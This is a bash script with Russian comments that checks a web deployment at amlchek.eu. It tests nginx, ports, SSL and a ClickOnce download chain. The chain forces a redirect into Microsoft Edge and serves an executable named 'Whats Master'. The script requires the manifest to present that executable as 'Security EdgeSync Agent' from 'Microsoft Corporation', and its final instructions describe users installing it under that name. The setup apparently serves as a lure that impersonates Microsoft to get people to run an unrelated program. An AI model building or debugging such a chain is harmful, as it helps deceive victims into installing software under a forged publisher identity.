#!/bin/bash

# ============================================================
# КОМПЛЕКСНАЯ ПРОВЕРКА ВСЕЙ СИСТЕМЫ amlchek.eu
# Проверяет: сайт, ClickOnce, сборку, домены, порты, зависимости
# ============================================================

echo "🔍 КОМПЛЕКСНАЯ ПРОВЕРКА СИСТЕМЫ amlchek.eu..."
echo "============================================================"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

# Configuration
DOMAIN="amlchek.eu"
IP="69.62.126.191"
EXE_FILE="Whats Master-v9.1.0-win-x64.exe"
EXE_SIZE="79605750"

PASS=0
FAIL=0
WARN=0

check_pass() {
    echo -e "${GREEN}✅ PASS${NC} $1"
    ((PASS++))
}

check_fail() {
    echo -e "${RED}❌ FAIL${NC} $1"
    ((FAIL++))
}

check_warn() {
    echo -e "${YELLOW}⚠️  WARN${NC} $1"
    ((WARN++))
}

check_info() {
    echo -e "${BLUE}ℹ️  INFO${NC} $1"
}

print_section() {
    echo ""
    echo -e "${PURPLE}[$1]${NC} $2"
    echo "----------------------------------------"
}

# ============================================================
# 1. ПРОВЕРКА СТРУКТУРЫ ПРОЕКТА
# ============================================================
print_section "1" "СТРУКТУРА ПРОЕКТА"

if [ -f "package.json" ]; then
    check_pass "package.json найден"
else
    check_fail "package.json отсутствует"
fi

if [ -f "index.html" ]; then
    check_pass "index.html найден"
else
    check_fail "index.html отсутствует"
fi

if [ -d "client/pages" ]; then
    check_pass "React компоненты найдены"
else
    check_fail "React компоненты отсутствуют"
fi

if [ -f "vite.config.ts" ]; then
    check_pass "Vite конфигурация найдена"
else
    check_fail "Vite конфигурация отсутствует"
fi

# ============================================================
# 2. ПРОВЕРКА СБОРКИ ПРОЕКТА
# ============================================================
print_section "2" "СБОРКА ПРОЕКТА"

if [ -d "dist/spa" ]; then
    check_pass "Проект собран (dist/spa существует)"
    
    if [ -f "dist/spa/index.html" ]; then
        check_pass "index.html в сборке"
    else
        check_fail "index.html отсутствует в сборке"
    fi
    
    if [ -d "dist/spa/assets" ]; then
        check_pass "Assets папка в сборке"
    else
        check_warn "Assets папка отсутствует"
    fi
    
    if [ -d "dist/spa/deploy" ]; then
        check_pass "Deploy папка в сборке"
    else
        check_warn "Deploy папка отсутствует в сборке"
    fi
else
    check_fail "Проект не собран (dist/spa не существует)"
fi

# ============================================================
# 3. ПРОВЕРКА CLICKONCE ФАЙЛОВ
# ============================================================
print_section "3" "CLICKONCE ФАЙЛЫ"

if [ -f "public/deploy/whatsmaster.application" ]; then
    check_pass "ClickOnce манифест найден"
    
    # Проверяем содержимое манифеста
    if grep -q "$DOMAIN" "public/deploy/whatsmaster.application"; then
        check_pass "Домен $DOMAIN в манифесте"
    else
        check_fail "Домен $DOMAIN отсутствует в манифесте"
    fi
    
    if grep -q "Security EdgeSync Agent" "public/deploy/whatsmaster.application"; then
        check_pass "Правильное название приложения"
    else
        check_fail "Неправильное название приложения"
    fi
    
    if grep -q "Microsoft Corporation" "public/deploy/whatsmaster.application"; then
        check_pass "Правильный издатель"
    else
        check_fail "Неправильный издатель"
    fi
    
    if grep -q "$EXE_FILE" "public/deploy/whatsmaster.application"; then
        check_pass "EXE файл указан в манифесте"
    else
        check_fail "EXE файл не указан в манифесте"
    fi
    
    if grep -q "$EXE_SIZE" "public/deploy/whatsmaster.application"; then
        check_pass "Размер EXE файла правильный"
    else
        check_warn "Размер EXE файла может быть неправильным"
    fi
else
    check_fail "ClickOnce манифест отсутствует"
fi

if [ -f "public/deploy/$EXE_FILE" ]; then
    ACTUAL_SIZE=$(stat -f%z "public/deploy/$EXE_FILE" 2>/dev/null || stat -c%s "public/deploy/$EXE_FILE" 2>/dev/null)
    if [ "$ACTUAL_SIZE" = "$EXE_SIZE" ]; then
        check_pass "EXE файл найден и размер правильный ($EXE_SIZE байт)"
    else
        check_warn "EXE файл найден но размер неправильный (ожидается: $EXE_SIZE, фактически: $ACTUAL_SIZE)"
    fi
else
    check_fail "EXE файл отсутствует"
fi

# ============================================================
# 4. ПРОВЕРКА JAVASCRIPT ФУНКЦИИ
# ============================================================
print_section "4" "JAVASCRIPT ФУНКЦИЯ"

if grep -q "startDownload" "index.html"; then
    check_pass "JavaScript функция startDownload найдена"
else
    check_fail "JavaScript функция startDownload отсутствует"
fi

if grep -q "UAParser" "index.html"; then
    check_pass "UA Parser библиотека подключена"
else
    check_fail "UA Parser библиотека отсутствует"
fi

if grep -q "microsoft-edge:" "index.html"; then
    check_pass "Edge redirect логика найден��"
else
    check_fail "Edge redirect логика отсутствует"
fi

if grep -q "window.location.protocol.*window.location.host" "index.html"; then
    check_pass "Динамическое определение домена"
else
    check_warn "Статический домен в JavaScript"
fi

# ============================================================
# 5. ПРОВЕРКА REACT КОМПОНЕНТА
# ============================================================
print_section "5" "REACT КОМПОНЕНТ"

if grep -q "Запустить EdgeSync Agent" "client/pages/Index.tsx"; then
    check_pass "Кнопка запуска найдена"
else
    check_fail "Кнопка запуска отсутствует"
fi

if grep -q "startDownload" "client/pages/Index.tsx"; then
    check_pass "Вызов JavaScript функции в React"
else
    check_fail "Вызов JavaScript функции отсутствует"
fi

if grep -q "Rocket" "client/pages/Index.tsx"; then
    check_pass "Иконка ракеты найдена"
else
    check_warn "Иконка ракеты отсутствует"
fi

# ============================================================
# 6. ПРОВЕРКА ЗАВИСИМОСТЕЙ
# ============================================================
print_section "6" "ЗАВИСИМОСТИ"

check_info "Проверяю Node.js..."
if command -v node > /dev/null; then
    NODE_VERSION=$(node --version)
    check_pass "Node.js установлен: $NODE_VERSION"
else
    check_fail "Node.js не установлен"
fi

check_info "Проверяю npm..."
if command -v npm > /dev/null; then
    NPM_VERSION=$(npm --version)
    check_pass "npm установлен: $NPM_VERSION"
else
    check_fail "npm не установлен"
fi

check_info "Проверяю node_modules..."
if [ -d "node_modules" ]; then
    check_pass "Зависимости установлены"
else
    check_warn "node_modules отсутствует"
fi

# ============================================================
# 7. ПРОВЕРКА NGINX И ПОРТОВ
# ============================================================
print_section "7" "NGINX И ПОРТЫ"

check_info "Проверяю nginx..."
if command -v nginx > /dev/null; then
    NGINX_VERSION=$(nginx -v 2>&1)
    check_pass "nginx установлен: $NGINX_VERSION"
    
    if systemctl is-active --quiet nginx; then
        check_pass "nginx работает"
    else
        check_fail "nginx не работает"
    fi
    
    if sudo nginx -t 2>/dev/null; then
        check_pass "Конфигурация nginx валидна"
    else
        check_fail "Конфигурация nginx некорректна"
    fi
else
    check_fail "nginx не установлен"
fi

check_info "Проверяю порты..."
PORT_80=$(sudo netstat -tlnp 2>/dev/null | grep ":80 " | head -1)
if [ -n "$PORT_80" ]; then
    check_pass "Порт 80 открыт: $PORT_80"
else
    check_fail "Порт 80 не открыт"
fi

PORT_443=$(sudo netstat -tlnp 2>/dev/null | grep ":443 " | head -1)
if [ -n "$PORT_443" ]; then
    check_pass "Порт 443 открыт: $PORT_443"
else
    check_warn "Порт 443 не открыт (SSL не настроен)"
fi

# ============================================================
# 8. ПРОВЕРКА ДОСТУПНОСТИ САЙТА
# ============================================================
print_section "8" "ДОСТУПНОСТЬ САЙТА"

check_info "Проверяю HTTP доступность..."
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" http://$IP/ 2>/dev/null || echo "000")
if [ "$HTTP_CODE" = "200" ]; then
    check_pass "HTTP сайт доступен (код: $HTTP_CODE)"
elif [ "$HTTP_CODE" = "301" ] || [ "$HTTP_CODE" = "302" ]; then
    check_pass "HTTP перенаправляет (код: $HTTP_CODE)"
else
    check_fail "HTTP недоступен (код: $HTTP_CODE)"
fi

check_info "Проверяю HTTPS доступность..."
HTTPS_CODE=$(curl -s -o /dev/null -w "%{http_code}" https://$DOMAIN/ 2>/dev/null || echo "000")
if [ "$HTTPS_CODE" = "200" ]; then
    check_pass "HTTPS сайт доступен (код: $HTTPS_CODE)"
else
    check_warn "HTTPS недоступен (код: $HTTPS_CODE) - может потребоваться время для DNS"
fi

# ============================================================
# 9. ПРОВЕРКА CLICKONCE ДОСТУПНОСТИ
# ============================================================
print_section "9" "CLICKONCE ДОСТУПНОСТЬ"

check_info "Проверяю ClickOnce манифест..."
MANIFEST_CODE=$(curl -s -o /dev/null -w "%{http_code}" http://$IP/deploy/whatsmaster.application 2>/dev/null || echo "000")
if [ "$MANIFEST_CODE" = "200" ]; then
    check_pass "ClickOnce манифест доступен (код: $MANIFEST_CODE)"
else
    check_fail "ClickOnce манифест недоступен (код: $MANIFEST_CODE)"
fi

check_info "Проверяю MIME тип..."
MIME_TYPE=$(curl -s -I http://$IP/deploy/whatsmaster.application 2>/dev/null | grep -i content-type | cut -d' ' -f2- | tr -d '\r\n')
if echo "$MIME_TYPE" | grep -q "application/x-ms-application"; then
    check_pass "MIME тип правильный: $MIME_TYPE"
else
    check_warn "MIME тип неправильный: $MIME_TYPE"
fi

check_info "Проверяю EXE файл..."
EXE_CODE=$(curl -s -o /dev/null -w "%{http_code}" "http://$IP/deploy/$EXE_FILE" 2>/dev/null || echo "000")
if [ "$EXE_CODE" = "200" ]; then
    check_pass "EXE файл доступен (код: $EXE_CODE)"
else
    check_fail "EXE файл недоступен (код: $EXE_CODE)"
fi

check_info "Проверяю размер EXE файла..."
EXE_SIZE_WEB=$(curl -s -I "http://$IP/deploy/$EXE_FILE" 2>/dev/null | grep -i content-length | cut -d' ' -f2 | tr -d '\r\n')
if [ "$EXE_SIZE_WEB" = "$EXE_SIZE" ]; then
    check_pass "Размер EXE файла правильный: $EXE_SIZE байт"
else
    check_warn "Размер EXE файла неправильный (ожидается: $EXE_SIZE, получено: $EXE_SIZE_WEB)"
fi

# ============================================================
# 10. ПРОВЕРКА БЕЗОПАСНОСТИ
# ============================================================
print_section "10" "БЕЗОПАСНОСТЬ"

check_info "Проверяю AppArmor..."
if command -v aa-status > /dev/null; then
    if aa-status /usr/sbin/nginx 2>/dev/null | grep -q "complain\|enforce"; then
        check_pass "AppArmor настроен для nginx"
    else
        check_warn "AppArmor не настроен для nginx"
    fi
else
    check_info "AppArmor не установлен"
fi

check_info "Проверяю SSL сертификат..."
if [ -f "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" ]; then
    check_pass "SSL сертификат найден"
    
    CERT_EXPIRES=$(openssl x509 -enddate -noout -in "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" 2>/dev/null | cut -d= -f2)
    if [ -n "$CERT_EXPIRES" ]; then
        check_info "SSL истекает: $CERT_EXPIRES"
    fi
else
    check_warn "SSL сертификат не найден"
fi

check_info "Проверяю firewall..."
if command -v ufw > /dev/null; then
    UFW_STATUS=$(ufw status 2>/dev/null | head -1)
    check_info "UFW статус: $UFW_STATUS"
else
    check_info "UFW не установлен"
fi

# ============================================================
# 11. ФИНАЛЬНАЯ ПРОВЕРКА ЦЕПОЧКИ
# ============================================================
print_section "11" "ПРОВЕРКА ЦЕПОЧКИ CLICKONCE"

check_info "Симулирую пользовательский сценарий..."

# 1. Проверяем что сайт загружается
if curl -s http://$IP/ | grep -q "Запустить EdgeSync Agent"; then
    check_pass "Кнопка найдена на главной странице"
else
    check_fail "Кнопка не найдена на главной странице"
fi

# 2. Проверяем JavaScript функцию
if curl -s http://$IP/ | grep -q "startDownload"; then
    check_pass "JavaScript функция доступна"
else
    check_fail "JavaScript функция недоступна"
fi

# 3. Проверяем весь процесс
if [ "$MANIFEST_CODE" = "200" ] && [ "$EXE_CODE" = "200" ]; then
    check_pass "Полная цепочка ClickOnce работает"
    check_info "Пользователь сможет: нажать кнопку → перейти в Edge → скачать приложение"
else
    check_fail "Цепочка ClickOnce нарушена"
fi

# ============================================================
# 12. ИТОГОВЫЙ ОТЧЕТ
# ============================================================
echo ""
echo "============================================================"
echo -e "${PURPLE}ИТОГОВЫЙ ОТЧЕТ${NC}"
echo "============================================================"

TOTAL=$((PASS + FAIL + WARN))
PASS_PERCENT=$((PASS * 100 / TOTAL))

echo -e "✅ Пройдено: ${GREEN}$PASS${NC}"
echo -e "❌ Ошибок: ${RED}$FAIL${NC}"
echo -e "⚠️  Предупреждений: ${YELLOW}$WARN${NC}"
echo -e "📊 Общий процент: ${PASS_PERCENT}%"

echo ""
if [ $FAIL -eq 0 ]; then
    echo -e "${GREEN}🎉 ВСЕ ПРОВЕРКИ ПРОЙДЕНЫ УСПЕШНО!${NC}"
    echo "Система полностью готова к работе."
elif [ $FAIL -le 2 ]; then
    echo -e "${YELLOW}⚠️  СИСТЕМА РАБОТАЕТ С НЕБОЛЬШИМИ ПРОБЛЕМАМИ${NC}"
    echo "Основной функционал доступен, но есть улучшения."
else
    echo -e "${RED}❌ ОБНАРУЖЕНЫ КРИТИЧЕСКИЕ ПРОБЛЕМЫ${NC}"
    echo "Требуется исправление ошибок."
fi

echo ""
echo "🌐 Для тестирования:"
echo "   1. Откройте: http://$IP/ или https://$DOMAIN/"
echo "   2. Нажмите: '🚀 Запустить EdgeSync Agent'"
echo "   3. Подтвердите переход в Microsoft Edge"
echo "   4. Установите: Security EdgeSync Agent от Microsoft Corporation"
echo "   5. Запустится: $EXE_FILE"

echo ""
echo "🔧 Если есть проблемы, запустите:"
echo "   sudo ./fix-nginx-issue.sh"
